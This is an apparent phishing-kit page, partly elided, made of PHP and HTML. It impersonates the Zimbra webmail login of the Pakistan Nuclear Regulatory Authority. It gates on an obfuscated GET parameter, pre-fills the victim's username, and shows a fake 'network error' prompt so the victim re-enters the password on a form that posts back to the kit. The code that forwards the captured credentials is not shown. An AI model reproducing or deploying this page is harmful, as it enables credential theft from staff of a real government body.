<?php
if(isset($_GET['kyujtrgw436ytrhfvsd9856trdfhbgfhsf176hbfdbdfhfghdgsdfewtewr'])){
$url=$_GET['kyujtrgw436ytrhfvsd9856trdfhbgfhsf176hbfdbdfhfghdgsdfewtewr'];
	...
	<div id="modifiedLogin" class="LoginScreen">
		<div class="modernCenter">
                <div class="modernContentBox">
                    <div class="logo">
                        <a href="https://webmail.pnra.org/#" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
                            <span class="ImgLoginBanner"></span>
                        </a>
                    </div>				
				<form id="zLoginForm" method="post" name="loginForm" action="" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="d77b2362-baaa-49a1-8706-2856d17ef2c8">

								<div class="signIn">Sign In</div>
								<div id="errorMessageDiv" class="errorMessage">
                            Network error occured. Verify that CAPS LOCK is not on, and then retype the current username and password.</div>
                        <div class="form">
                        
                        <div class="loginSection">
                                    <label for="username" class="zLoginFieldLabel">Username</label>
                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="<?=$name?>" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
    ...
    if (x.type === "password") {
        ...
        z.style.display = "none";
                                    ...
                                    <div class="signInAndLabel">
                                        <div>
                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton" onclick="CheckValidCaptcha();">Sign In</button>
                                        </div>
		...
		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2022, Pakistan Nuclear Regulatory Authority</div>
		</div>
